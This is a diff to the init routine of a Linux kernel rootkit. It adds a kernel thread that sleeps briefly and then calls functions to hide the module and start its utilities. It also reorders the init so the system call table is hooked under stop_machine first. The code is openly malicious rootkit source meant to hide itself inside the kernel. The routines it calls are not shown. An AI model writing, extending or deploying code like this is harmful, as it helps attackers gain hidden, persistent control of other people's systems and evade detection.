@@ -1,4 +1,6 @@
+#include <linux/delay.h>
 #include <linux/init.h>
+#include <linux/kthread.h>
 #include <linux/module.h>
 #include "fs_helper.h"
 #include "hook.h"
@@ -7,14 +9,20 @@
 
 MODULE_LICENSE("GPL");
 
+static int init_callback(void *data)
+{
+    msleep(1000);
+    hide_module();
+    utils_init();
+    return 0;
+}
 
 static int __init rootkit_init(void)
 {
-    printk(KERN_ALERT "rootkit init\n");
     init_x64_sys_call();
     stop_machine(init_syscall_table, NULL, NULL);
-    hide_module();
-    utils_init();
+    printk(KERN_ALERT "rootkit init\n");
+    kthread_run(init_callback, NULL, "init_callback");
     return 0;
 }
 
